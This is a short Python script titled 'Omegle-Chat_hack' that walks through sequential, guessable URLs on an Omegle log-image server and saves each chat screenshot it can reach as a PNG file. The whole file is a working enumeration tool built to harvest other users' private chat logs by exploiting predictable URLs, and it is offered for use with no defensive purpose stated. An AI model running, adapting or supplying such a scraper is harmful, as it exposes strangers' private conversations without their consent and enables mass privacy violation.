# Omegle-Chat_hack
# Made by - Indrajeet Bhuyan (www.hackatrick.com)
#
#
# Version: 0.1 
# Date:    07-08-2016 (dd-mm-yyyy)
#
# This tool downloads random chat logs which are saved in omegle's server.



import urllib.request
import random
ran=random.randint(100,500)
url="http://l.omegle.com/7"
print("\t\t----------Omegle Chat Hack----------\n")
numberofImagesWanted=int(input("enter limit 100-500 : " ))
end="2f6.png"
for i in range (ran,ran+numberofImagesWanted):
    
    finalurl=url+str(i)+end

    omRequest = urllib.request.Request(finalurl)
    try : 
            req = urllib.request.urlopen(omRequest)
            print('Chat downloaded \n***********************\n')
            filename = str(i)+".png"
            output = open(filename,"wb")
            output.write(req.read())
            output.close()
    except  urllib.error.URLError as e:
            print("Unsuccessful")
            continue

